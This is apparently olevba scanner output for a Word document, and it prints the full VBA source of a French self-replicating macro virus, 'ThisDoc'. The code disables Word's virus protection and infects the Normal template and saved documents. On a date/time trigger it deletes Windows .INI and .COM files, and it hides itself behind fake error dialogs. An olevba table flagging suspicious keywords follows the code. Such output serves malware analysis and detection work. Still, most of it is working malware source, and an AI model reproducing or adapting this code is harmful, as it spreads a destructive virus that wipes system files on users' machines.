olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ThisDocument-a4ff0701c7fa2cbfc19fe5bd338120c12cb27f74
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ThisDocument-a4ff0701c7fa2cbfc19fe5bd338120c12cb27f74 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDO
Dim Fichier$
Fichier$ = Dir("C:\ThisDoc.log")
If Fichier$ <> "ThisDoc.log" Then
    Application.VBE.ActiveVBProject.VBComponents("ThisDocument").Export FileName:="C:\ThisDoc.log"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile FileName:="C:\ThisDoc.log"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 5
    MsgBox "Attention, ThisDocument est infecté...", vbInformation, "Virus ThisDoc"
End If
ErrorDO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile FileName:="C:\ThisDoc.log"
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 5
MsgBox "Je suis une Nouvelle Génération de Virus de Macro...", vbInformation, "Virus ThisDoc"
ErrorFSA:
End Sub
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 2)
If D$ = "15" Then
    MsgBox "ZeMacroKiller98 est heureux de vous présenter sa nouvelle création...", vbInformation, "Virus ThisDoc"
End If
T$ = Mid(MyTime, 1, 2)
If T$ = D$ Then
    MsgBox "Vos données vont être détruites...", vbCritical, "Virus ThisDoc"
    Kill "C:\Windows\*.INI"
    Kill "C:\Windows\*.COM"
End If
ErrorAE:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Erreur Système" & Chr$(13) & "Veuillez réessayer plus tard", vbInformation, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

